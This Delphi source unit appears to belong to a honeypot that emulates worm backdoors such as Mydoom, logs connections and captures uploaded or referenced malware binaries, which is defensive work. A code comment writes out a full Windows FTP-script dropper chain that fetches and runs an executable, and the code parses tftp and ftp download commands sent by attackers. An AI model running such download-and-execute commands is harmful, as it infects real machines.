   unit untScript;

   interface

   uses
     Windows, Sysutils, Winsock, MD5, Messages,
     untHTTPDownload, untFTPDownload, untAlert;

   type
     TInfo = Record
       dScript: String;
     End;
     PInfo = ^TInfo;

     TResp = Record
       dGet: String;
       dResp: String;
       dFirst: Bool;
     End;

     TScript = Class(TObject)
     Private
       dRespond    :Bool;
       dBBTrans    :Bool;
       dRespCount  :Integer;
       dPort       :Integer;
       dTransfer   :Integer;
       dName       :String;
       dVer        :String;
       dCount      :Integer;
       sData       :Integer;
       rData       :Integer;

       Response    :Array[0..100] Of TResp;

       Procedure ReadFileStr(Name: String; Var Output: String);
       Function  GetParam(dName, dText: String): String;
       Function  GetResponse(dText: String): TResp;
       Procedure StartServer(Int: Integer);
       Procedure ReceiveFile(Int: Integer);
     Public
       dScript     :String;
       Procedure Start;
     End;

     Var
       Info  :TInfo;
       GoOn  :Bool;
       gSock :TSocket;

     Procedure LoadScript(dName: String);
     Procedure RunScript(P: Pointer); STDCALL;
     Function rIP(Sock: TSocket): String;

   implementation

   Uses
     untMainForm;

   Function rIP(Sock: TSocket): String;
   Var
     S     :TSockAddrIn;
     I     :Integer;
     W     :TWSAData;
   Begin
     WSAStartUP($0101, W);
     I := SizeOf(S);
     GetPeerName(Sock, S, I);
     Result := INET_NTOA(S.SIN_ADDR) +':'+ IntToStr(nTohs(S.sin_port));
     WSACLEANUP;
   End;

   Function GrabIncome(Sock: TSocket): Bool;
   Var
     dTimeOut      :TIMEVAL;
     dStruct       :TFDSET;
   Begin
     dTimeOut.tv_sec := 30;
     dTimeOut.tv_usec := 0;
     FD_ZERO(dStruct);
     FD_SET(Sock, dStruct);
     If (Select(0, @dStruct, nil, nil, @dTimeout) <= 0) Then
     Begin
       Result := False;
       Exit;
     End;
     Result := True;
   End;

   Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
   Var
     xPos: Integer;
   Begin
     While Pos(ReplaceWord, Text)>0 Do
     Begin
       xPos := Pos(ReplaceWord, Text);
       Delete(Text, xPos, Length(ReplaceWord));
       Insert(WithWord, Text, xPos);
     End;
   End;

   Procedure TScript.ReceiveFile(Int: Integer);
   Var
     WSA           :TWSAData;
     Sock          :TSocket;
     eSock         :TSocket;
     SockAddr      :TSockAddr;
     SockAddrIn    :TSockAddrIn;
     Buffer        :Array[0..1024] Of Char;
     dErr          :Integer;
     AddrLen       :Integer;
     F             :FILE;
     Data          :String;
     MalwareName   :String;

     Start         :Integer;
     Total         :Integer;
     Speed         :Integer;
   Begin
       MalwareName := '[' + dName + '.' + dVer + ']-';
       if (Form1.CheckBox4.Checked) Then MalwareName := MalwareName + TimeToStr(Now) + '_' + DateToStr(Now) + '-';
       if (Form1.ChecKBox5.Checked) Then Malwarename := MalwareName + Copy(rIP(eSock), 1, Pos(':', rIP(eSock))-1)+'-';
       MalwareName := MalwareName + MD5Print(MD5String(TimeToStr(Now)+dName+dVer+DateToStr(Now)));
       if (Form1.CheckBox3.Checked) Then MalwareName := MalwareName + '.bin' Else MalwareName := MalwareName + '.exe';

       ReplaceStr(':', '-', MalwareName);
       ReplaceStr('/', '-', MalwareName);

       MalwareName := MalwarePath + MalwareName;

   //  Form1.AddLog('@'+dName+'.'+dVer+': File-transfer starting at port ('+IntToStr(Int)+')');
     Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': File-transfer starting at port ('+IntToStr(Int)+')');
     WSAStartUp($0101, WSA);

     Sock := Socket(AF_INET, SOCK_STREAM, 0);
     If (Sock = INVALID_SOCKET) Then Exit;

     FillChar(SockAddrIn, SizeOf(SockAddrIn), 0);
     SockAddrIn.sin_family := AF_INET;
     SockAddrIn.sin_port := hTons(Int);
     SockAddrIn.sin_addr.S_addr := INADDR_ANY;

     If Bind  (Sock, SockAddrIn, SizeOf(SocKAddrIn)) <> 0 Then Exit;
     If Listen(Sock, SOMAXCONN) <> 0 Then Exit;

     AddrLen := SizeOf(SockAddr);
     While TRUE Do
     Begin
       eSock := Accept(Sock, @SockAddr, @AddrLen);
       If (eSock = INVALID_SOCKET) Then Exit;

       Form1.AddLog('@'+dName+'.'+dVer+': File-transfer started at port ('+IntToStr(Int)+') from ('+rIP(eSock)+')');
       Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': File-transfer started at port ('+IntToStr(Int)+') from ('+rIP(eSock)+')');
       Inc(REMOTE_CONNECTIONS);
       Form1.AddCount(dName, dVer);

       ZeroMemory(@Buffer, SizeOf(Buffer));

       If (dCount > 0) Then
       Begin
         Inc(dCount);

         If (Response[dCount].dFirst) Then
         Begin
           Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);
           INC(DATA_SENT, Length(Response[dCount].dResp));
           Inc(sData, Length(Response[dCount].dResp));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           If (Not GrabIncome(eSock)) Then Exit;
           dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
           Inc(rData, dErr);
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
         End Else
         Begin
           If (Not GrabIncome(eSock)) Then Exit;
           dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
           Inc(rData, dErr);
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           If (Response[dCount].dGet = '*') Then Response[dCount].dGet := String(Buffer);
           If (Response[dCount].dGet = String(Buffer)) Then
           Begin
             Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);
             INC(DATA_SENT, Length(Response[dCount].dResp));
             Inc(sData, Length(Response[dCount].dResp));
             Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           End;
         End;
       End;

       Start := GetTickCount;
       Total := 1;

       Form1.AddLog('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');
       Form1.Memo4.Lines.Add('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');
       AssignFile(F, MalwareName);
       ReWrite(F, 1);
       Repeat
         If (Not GrabIncome(eSock)) Then Exit;
         dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
         If dErr <= 0 Then
           Break;
         Inc(rData, dErr);
         Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
         Total := Total + dErr;
         BlockWrite(F, Buffer, dErr);
         INC(DATA_RECEIVED, dErr);
         ZeroMemory(@Buffer, SizeOf(Buffer));
         If (dBBTrans) Then
         Begin
           Data := '*';
           Send(eSock, Data[1], length(Data), 0);
           INC(DATA_SENT, Length(Data));
           Inc(sData, Length(Data));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
         End;
       Until eSock = INVALID_SOCKET;
       CloseFile(F);
       Speed := Total DIV (((GetTickCount - Start) DIV 1000) + 1);
       If (Speed > RECEIVE_SPEED) Then
         RECEIVE_SPEED := Speed;

       If (Total <= 0) Then
         If (Form1.CheckBox2.Checked) Then
           DeleteFile(pChar(MalwareName));

       If (dCount > 0) Then
       Begin
         Inc(dCount);

         If (Response[dCount].dFirst) Then
         Begin
           Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);
           Inc(sData, Length(Response[dCount].dResp));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           INC(DATA_SENT, Length(Response[dCount].dResp));
           If (Not GrabIncome(eSock)) Then Exit;
           dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
           Inc(rData, dErr);
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
         End Else
         Begin
           If (Not GrabIncome(eSock)) Then Exit;
           dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
           Inc(rData, dErr);
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           If (Response[dCount].dGet = '*') Then Response[dCount].dGet := String(Buffer);
           If (Response[dCount].dGet = String(Buffer)) Then
           Begin
             Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);
             INC(DATA_SENT, Length(Response[dCount].dResp));
             Inc(sData, Length(Response[dCount].dResp));
             Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           End;
         End;
       End;
       Form1.AddLog('@'+dName+'.'+dVer+': Received file from ('+rIP(eSock)+')');
       Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Received file from ('+rIP(eSock)+')');

       CloseSocket(eSock);
     End;
     CloseSocket( Sock);
     WSACleanUP;
   End;

   Function IsNumeric(Str : String): Bool;
   Var
     I: Integer;
     N: String;
   Begin
     Result := True;
     N := '0123456789';
     For I := 1 To Length(Str) Do
       If (Pos(Str[I], N) = 0) Then Result := False;
   End;

   Procedure TScript.StartServer(Int: Integer);
   Var
     WSA           :TWSAData;
     eSock         :TSocket;
     Sock          :TSocket;
     SockAddr      :TSockAddr;
     SockAddrIn    :TSockAddrIn;
     Buffer        :Array[0..1024] Of Char;
     wBuffer       :Array[0..1024] Of Char;
     Data          :AnsiString;
     CountDown     :Integer;
     AddrLen       :Integer;
     F             :FILE;
     dErr          :Integer;
     dLen          :Integer;
     U             :Integer;
     I             :Integer;
     FTPUser       :String;
     FTPPort       :String;
     FTPFile       :String;
     FTPName       :String;
     FTPPass       :String;
     MalwareName   :String;

     Start         :Integer;
     Total         :Integer;
     Speed         :Integer;

     AlertThread   :DWord;
   Label
     GoBack, HurryTransfer, HurryATransfer, ListenForMore, CloseRemote;
   Begin
     Sleep(500);
     Sock := INVALID_SOCKET;
   //  Form1.AddLog('@'+dName+'.'+dVer+': Starting server at port ('+IntToStr(Int)+')');
   GoBack:
     If (Sock <> INVALID_SOCKET) Then
     Begin
       CloseSocket(Sock);
       WSACleanUP;
     End;

     WSAStartUp($0101, WSA);

     Sock := Socket(AF_INET, SOCK_STREAM, 0);
     If (Sock = INVALID_SOCKET) Then Goto GoBack;

     FillChar(SockAddrIn, SizeOf(SockAddrIn), 0);
     SockAddrIn.sin_family := AF_INET;
     SockAddrIn.sin_port := hTons(Int);
     SockAddrIn.sin_addr.S_addr := INADDR_ANY;

     Form1.SetSocket(1, dName, dVer, INVALID_SOCKET);
     Form1.SetSocket(2, dName, dVer, INVALID_SOCKET);
     If Bind(Sock, SockAddrIn, SizeOf(SockAddrIn)) <> 0 Then Begin INC(SCRIPT_FAILED); Form1.AddErr(dName, dVer); Exit; End;
     If Listen(Sock, SOMAXCONN) <> 0 Then Begin INC(SCRIPT_FAILED); Form1.AddErr(dName, dVer); Goto GoBack; End;
     Form1.SetSocket(1, dName, dVer, Sock);
     Form1.SetSocket(2, dName, dVer, INVALID_SOCKET);

     Form1.AddLog('@'+dName+'.'+dVer+': Server successfully started, waiting for connnections');

     AddrLen := SizeOf(SockAddr);
     While TRUE Do
     Begin
       eSock := Accept(Sock, @SockAddr, @AddrLen);
       If (eSock = INVALID_SOCKET) Then Begin INC(EXPLOIT_FAILURE); Goto GoBack; End;

       rData := 0;
       sData := 0;

       If (Form1.Visible = False) Then
         CreateThread(NIL, 0, @DoAlert, NIL, 0, AlertThread);

       Form1.SetSocket(1, dName, dVer, Sock);
       Form1.SetSocket(2, dName, dVer, eSock);
       // Someone connected.
       Form1.AddLog('@'+dName+'.'+dVer+': Connection established from ('+rIP(eSock)+')');
       Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Connection established from ('+rIP(eSock)+')');
       Inc(REMOTE_CONNECTIONS);
       Form1.AddVisitor(rIP(eSock), dName+'.'+dVer);
       Form1.AddCount(dName, dVer);

       MalwareName := '[' + dName + '.' + dVer + ']-';
       if (Form1.CheckBox4.Checked) Then MalwareName := MalwareName + TimeToStr(Now) + '_' + DateToStr(Now) + '-';
       if (Form1.ChecKBox5.Checked) Then Malwarename := MalwareName + Copy(rIP(eSock), 1, Pos(':', rIP(eSock))-1)+'-';
       MalwareName := MalwareName + MD5Print(MD5String(TimeToStr(Now)+dName+dVer+DateToStr(Now)));
       if (Form1.CheckBox3.Checked) Then MalwareName := MalwareName + '.bin' Else MalwareName := MalwareName + '.exe';

       ReplaceStr(':', '-', MalwareName);
       ReplaceStr('/', '-', MalwareName);

       MalwareName := MalwarePath + MalwareName;

       // now lets talk with this foo.
       CountDown := dRespCount;
       dCount := 0;

       If (CountDown > 0) Then
       Repeat
         If (Response[dCount].dFirst) Then
         Begin
           If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;
           If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;

           If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;
           If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;
           If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;
           Inc(sData, Length(Response[dCount].dResp));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
   //        If (Recv(eSock, Buffer, SizeOf(Buffer), 0) < 0) Then Break;
         End Else
         Begin
           If (Not GrabIncome(eSock)) Then Goto ListenForMore;
           dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
           If (dErr < 0) Then Break;
           Inc(rData, dErr);
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;
           If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;

           If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;
           If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;
           If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;
           Inc(sData, Length(Response[dCount].dResp));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
         End;

         Inc(DATA_SENT, Length(Response[dCount].dResp));
         Inc(DATA_RECEIVED, Length(String(Buffer)));

         If (String(Buffer) <> '') Then
           Form1.AddIncome(rIP(eSock), String(Buffer));
           //Form1.Memo1.Lines.Add('['+TimeToStr(Now)+' RECV '+rIP(eSock)+']'+String(Buffer));
         ZeroMemory(@Buffer, SizeOf(Buffer));

           If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;
           If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;

           If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;
           If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;

         Inc(dCount);
         Dec(CountDown);

         If (CountDown = 0) Then Goto ListenForMore;
       Until CountDown < 0;

       // If you came here, then somethere went wrong
       Goto ListenForMore;

       // HurryTransfer !
   HurryTransfer:
       Form1.AddLog('@'+dName+'.'+dVer+': Starting a transfer on same port ('+IntToStr(dPort)+') with ('+rIP(eSock)+')');
       Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Starting a transfer on same port ('+IntToStr(dPort)+') with ('+rIP(eSock)+')');
       If (dPort = dTransfer) Then
       Begin
         If (Response[dCount].dResp = '*[transfer]') Then
         Begin
           Data := '_';
           Send(eSock, Data[1], Length(Data), 0);
           Inc(sData, Length(Data));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           Inc(DATA_SENT, Length(Data));
           Inc(dCount);
         End;

         Start := GetTickCount;
         Total := 1;

         AssignFile(F, MalwareName);
         Rewrite(F, 1);

         dLen := 0;
         U := 0;
         If (dName = 'Mydoom') Then
         Begin
           Repeat
             If (Not GrabIncome(eSock)) Then
             Begin
               CloseFile(F);
               Goto CloseRemote;
             End;
             dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
             If (Buffer[U] <> 'M') And (dLen = 0) Then
             Begin
               U := 0;
               Repeat Inc(U); Until (Buffer[U] = 'M') Or (U > 20);
               If (U < 20) Then
               Begin
                 Move(Buffer[U], wBuffer[0], SizeOf(Buffer)-U);
                 If (dErr > 0) Then BlocKWrite(F, wBuffer, dErr);
               End;
               Inc(dLen);
             End Else
               If (dErr > 0) Then BlocKWrite(F, Buffer, dErr);
             FillChar(Buffer, SizeOf(Buffer), 0);
             FillChar(wBuffer, SizeOf(wBuffer), 0);
           Until dErr <= 0;
           dLen := 0;
         End Else
         Begin
           Repeat
             FillChar(Buffer, SizeOf(Buffer), 0);
             If (Not GrabIncome(eSock)) Then
             Begin
               CloseFile(F);
               Goto CloseRemote;
             End;
             dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
             If (dErr > 0) Then
               BlockWrite(F, Buffer, dErr);
             If (dBBTrans) Then
             Begin
               Data := '*';
               Send(eSock, Data[1], length(Data), 0);
               INC(DATA_SENT, Length(Data));
               Inc(sData, Length(Data));
               Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
             End;
           Until dErr <= 0;
         End;

         Total := FileSize(F);
         CloseFile(F);
         If (Total <= 0) Then
           If (Form1.CheckBox2.Checked) Then
             DeleteFile(pChar(MalwareName));
         Inc(rData, Total);
         Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
         Inc(Data_Received, Total);
         Form1.AddLog('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');
         Form1.Memo4.Lines.Add('Created '+MalwareName);

         Speed := Total DIV (((GetTickCount - Start) DIV 1000) + 1);
         If (Speed > RECEIVE_SPEED) Then
           RECEIVE_SPEED := Speed;

       End;
       Goto ListenForMore;

   HurryATransfer:
       Form1.AddLog('@'+dName+'.'+dVer+': Starting transfer on additional port ('+IntToStr(dTransfer)+') from ('+rIP(eSock)+')');
       If (dTransfer > 0) and (dPort <> dTransfer) Then
       Begin
         If (Response[dCount].dResp = '*[transfer]') Then
         Begin
           Data := '_';
           Send(eSock, Data[1], Length(Data), 0);
           Inc(DATA_SENT, Length(Data));
           Inc(dCount);
           Inc(sData, Length(Data));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
         End;

         ReceiveFile(dTransfer);
       End;
       Goto ListenForMore;

   ListenForMore:
       Form1.AddLog('@'+dName+'.'+dVer+': Waiting for receive data from '+rIP(eSock));
       If (CountDown > 0) Then
       Repeat
         If (Response[dCount].dFirst) Then
         Begin
           If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;
           Inc(sData, Length(Response[dCount].dResp));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
   //        If (Recv(eSock, Buffer, SizeOf(Buffer), 0) < 0) Then Break;
         End Else
         Begin
           If (Not GrabIncome(eSock)) Then Goto CloseRemote;
           dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
           If (dErr < 0) Then Break;
           Inc(rData, dErr);
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
           If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;
           Inc(sData, Length(Response[dCount].dResp));
           Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);
         End;

         Inc(DATA_SENT, Length(Response[dCount].dResp));
         Inc(DATA_RECEIVED, Length(String(Buffer)));

         If (String(Buffer) <> '') Then
           Form1.AddIncome(rIP(eSock), String(Buffer));
   //        Form1.Memo1.Lines.Add('['+TimeToStr(Now)+' RECV '+rIP(eSock)+']'+String(Buffer));
         ZeroMemory(@Buffer, SizeOf(Buffer));

         Inc(dCount);
         Dec(CountDown);
         If (CountDown < 0) Then Break;
       Until CountDown < 0;

       Repeat
         ZeroMemory(@Buffer, SizeOf(Buffer));
         If (Not GrabIncome(eSock)) Then Goto CloseRemote;
         dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);
         Data := String(Buffer);
         Inc(DATA_RECEIVED, Length(Data));
         Inc(rData, dErr);
         Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);

         If (Data <> '') Then
           Form1.AddIncome(rIP(eSock), Data);

         (* http://domain.com/file.exe *)
         If (LowerCase(Copy(Data, 1, 4)) = 'http') Then
         Begin
           Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from HTTP ('+Data+')');
           DownloadFileFromURL(Data, MalwareName);
           Form1.Memo4.Lines.Add('Created '+ MalwareName);
         End;

         (* ftp://user:pass@domain:port/file.exe *)
         If (LowerCase(Copy(Data, 1, 3)) = 'ftp') Then
         Begin
           Delete(Data, 1, 6);
             FTPUser := Copy(Data, 1, Pos(':', Data)-1);
           Delete(Data, 1, Pos(':', Data));
             FTPPass := Copy(Data, 1, Pos('@', Data)-1);
           Delete(Data, 1, Pos('@', Data));
             FTPName := Copy(Data, 1, Pos(':', Data)-1);
           Delete(Data, 1, Pos(':', Data));
             FTPPort := Copy(Data, 1, Pos('/', Data)-1);
           Delete(Data, 1, Pos('/', Data));
             FTPFile := Data;
           If (pos(' ', FTPFile) > 0) Then Delete(FTPFile, Pos(' ', FTPFile), Length(FTPFile));
           If (pos(#10, FTPFile) > 0) Then Delete(FTPFile, Pos(#10, FTPFile), Length(FTPFile));
           If (pos(#13, FTPFile) > 0) Then Delete(FTPFile, Pos(#13, FTPFile), Length(FTPFile));

           Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from FTP ('+FTPUser+':'+FTPPass+' @ '+FTPName+':'+FTPPort+' : '+FTPFile+')');

           Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']'+
           'Connecting to '+FTPName+':'+FTPPort+'/'+FTPFile+' User:'+FTPUser+' Pass:'+FTPPass);

           DownloadFileFromFTP(FTPUser, FTPPass, FTPName+'/'+FTPFile, MalwareName, StrToInt(FTPPort));
         End;

         (* tftp -i domain file.exe *)
         If (LowerCase(Copy(Data, 1, 4)) = 'tftp') Then
         Begin
           FTPName := Copy(Data, Pos('-i', Data)+3, Length(Data));
           FTPName := Copy(FTPName, 1, Pos(' ', FTPName)-1);

           FTPFile := Copy(Data, Pos('GET', UpperCase(Data)) + 4, Length(Data));

           If (FTPFile[Length(FTPFile)] = #10) then Delete(FTPFile, Length(FTPFile), 1);

           Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from TFTP ('+FTPName+' : '+FTPFile+')');
           Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']Connecting to '+FTPName+':69 > '+FTPFile);

           DownloadFileFromFTP('', '', FTPName+'/'+FTPFile, MalwareName, 69);
         End;

         (* echo open domain port ? echo user ? echo pass ? echo get file.exe ? echo bye ? *)
         If (LowerCase(Copy(Data, 1, 9)) = 'echo open') Then
         Begin
           (*
             echo open 127.0.0.1 1234>>o&
             echo h>>o&
             echo h>>o&
             echo get cool.exe>>o&
             echo bye>>o&
             ftp -n -s:o&
             cool.exe&
             del o&
             exit
           *)

           // the host
           FTPName := Copy(Data, Pos('open', LowerCase(Data))+5, Length(Data));
           FTPName := Copy(FTPName, 1, Pos(' ', FTPName)-1);

           // the port
           FTPPort := Copy(Data, Pos('open', LowerCase(Data))+5, Length(Data));
           FTPPort := Copy(FTPPort, Pos(' ', FTPPort)+1, Length(FTPPort));
           If (Pos(' ', FTPPort) > Pos('>>', FTPPort)) Then
             FTPPort := Copy(FTPPort, 1, Pos('>>', FTPPort)-1)
           Else If (Pos(' ', FTPPort) < Pos('>>', FTPPort)) Then
             FTPPort := Copy(FTPPort, 1, Pos(' ', FTPPort)-1);
           For I := 1 To Length(FTPPort) Do
             If (Not IsNumeric(FTPPort[i])) Then
             Begin
               Delete(FTPPort, I, Length(FTPPort));
               Break;
             End;

           // the file
           FTPFile := Copy(Data, Pos('get', LowerCase(Data))+4, Length(Data));
           FTPFile := Copy(FTPFile, 1, Pos('.', FTPFile)+3);

           // the user
           FTPUser := Copy(Data, Pos('echo', LowerCase(Data))+4, Length(Data));
           FTPUser := Copy(FTPUser, Pos('echo', LowerCase(FTPUser))+4, Length(FTPUser));
           FTPUser := Copy(FTPUser, 1, Pos('>>', FTPUser)-1);

           // the pass
           FTPPass := Copy(Data, Pos('echo', LowerCase(Data))+4, Length(Data));
           FTPPass := Copy(FTPPass, Pos('echo', LowerCase(FTPPass))+4, Length(FTPPass));
           FTPPass := Copy(FTPPass, Pos('echo', LowerCase(FTPPass))+4, Length(FTPPass));
           FTPPass := Copy(FTPPass, 1, Pos('>>', FTPPass)-1);

           FTPName := Trim(FTPName);
           FTPPort := Trim(FTPPort);
           FTPFile := Trim(FTPFile);
           FTPUser := Trim(FTPUser);
           FTPPass := Trim(FTPPass);

           Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from FTP ('+FTPuser+':'+FTPPass+' @ '+FTPName+':'+FTPPort+' '+FTPFile+')');
           Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']'+
           'Connecting to '+FTPName+':'+FTPPort+'/'+FTPFile+' User:'+FTPUser+' Pass:'+FTPPass);

           DownloadFileFromFTP(FTPUser, FTPPass, FTPName+'/'+FTPFile, MalwareName, StrToInt(FTPPort));
         End;
       Until dErr <= 0;

       Form1.AddLog('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');
       Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');
       Form1.DeleteVisitor(rIP(eSock), dName+'.'+dVer);
       Sleep(1000);
       CloseSocket(eSock);

       rData := 0;
       sData := 0;
     End;

   CloseRemote:
     If (eSock <> INVALID_SOCKET) Then
     Begin
       Form1.AddLog('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');
       Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');
       Form1.DeleteVisitor(rIP(eSock), dName+'.'+dVer);
       rData := 0;
       sData := 0;
     End;

     CloseSocket(Sock);
     WSACleanUP;

     INC(EXPLOIT_SUCCESS);
   Goto GoBack;
   End;

   Function TScript.GetParam(dName, dText: String): String;
   Var
     P: Integer;
   Begin
     P := Pos( LowerCase(dName), LowerCase(dText) );
     If (P > 0) Then
     Begin
       Result := Copy(dText, P+1, length(dText));
       Result := Copy(Result, 1, Pos(#13, Result)-1);
       Result := Trim(Copy(Result, Pos(':', Result)+1, Length(Result)));
       If LowerCase(Result) = 'yes' Then Result := '1';
       If LowerCase(Result) = 'no' Then Result := '0';
       Result := Trim(Result);
     End;
   End;

   Function TScript.GetResponse(dText: String): TResp;
   Var
     I     :Integer;
     Tmp   :String;
   Begin
     Result.dGet := '';
     Result.dResp := '';

     If (dText[1] <> '"') Then Exit;

     Delete(dText,1,1);
     Result.dGet := Copy(dText, 1, Pos('"', dText)-1);
     Delete(dText, 1, Pos('"', dText));
     Delete(dText, 1, pos('"', dText));
     Result.dResp := Copy(dText, 1, Pos('"', dText)-1);

     Tmp := Copy(dText, Pos('"', dText)+1, Length(dText));
     Tmp := Trim(Tmp);

     Result.dFirst := False;
     If (Tmp = 'nf') Then
       Result.dFirst := False;
     If (Tmp = 'f') Then
       Result.dFirst := True;
   End;

   Procedure TScript.Start;
   Var
     Data  :String;
     Resp  :TResp;
     Temp  :String;
     I     :Integer;
     C     :Integer;
   Begin
     If Not FileExists(dScript) Then Exit;
     ReadFileStr(dScript, Data);

     FillChar(Response, SizeOf(Response), 0);

     dBBTrans := False;
     If GetParam('bounceback-transfer', Data) <> '' Then
       dBBTrans      := Boolean(StrToInt(GetParam('bounceback-transfer', Data)));

     dRespond := False;
     If GetParam('response', Data) <> '' Then
       dRespond      := Boolean(StrToInt(GetParam('response', Data)));

     If GetParam('port', Data) <> '' Then
       dPort         := StrToInt(GetParam('port', Data));

     If (GetParam('transferport', Data) <> '') Then
       dTransfer     := StrToInt(GetParam('transferport', Data));

     dName         := GetParam('name', Data);
     dVer          := GetParam('ver', Data);

     If (dRespond) Then
     Begin
       dRespCount := StrToInt(GetParam('resp-count', Data));
       C := 0;
       For I := 1 To dRespCount Do
       Begin
         Temp := Copy(Data, Pos('ifd'+IntToStr(I), LowerCase(Data)), Length(Data));
         Temp := Copy(Temp, Pos('"', Temp), Length(Temp));
         If (Pos(#13, Temp) > 0) Then
           Temp := Copy(Temp, 1, Pos(#13, Temp)-1);
         If (Temp <> '') Then
         Begin
           Resp := GetResponse(Temp);
           If (Resp.dGet <> '') Then
           Begin
             Response[C] := Resp;
             Inc(C);
           End;
         End;
       End;
     End;

     If (dPort > 0) Then
     Begin
       INC(SCRIPT_LOADED);
       StartServer(dPort);
     End Else
       INC(SCRIPT_FAILED);
   End;

   Procedure RunScript(P: Pointer); STDCALL;
   Var
     Script:TScript;
     Name  :String;
   Begin
     Name := PInfo(P)^.dScript;
     Script := TScript.Create;
     Script.dScript := Name;
     GoOn := True;
     Script.Start;
   End;

   Procedure LoadScript(dName: String);
   Var
     Thread:DWord;
   Begin
     GoOn := False;
     Info.dScript := dName;
     CreateThread(NIL, 0, @RunScript, @Info, 0, Thread);
     Repeat
       Sleep(1);
     Until GoOn;
   End;

   Procedure TScript.ReadFileStr(Name: String; Var Output: String);
   Var
     cFile :File Of Char;
     Buf   :Array [1..1024] Of Char;
     Len   :LongInt;
     Size  :LongInt;
   Begin
     Try
       Output := '';

       AssignFile(cFile, Name);
       Reset(cFile);
       Size := FileSize(cFile);
       While Not (Eof(cFile)) Do
       Begin
         BlockRead(cFile, Buf, 1024, Len);
         Output := Output + String(Buf);
       End;
       CloseFile(cFile);

       If Length(Output) > Size Then
         Output := Copy(Output, 1, Size);
     Except
       ;
     End;
   End;

   end.
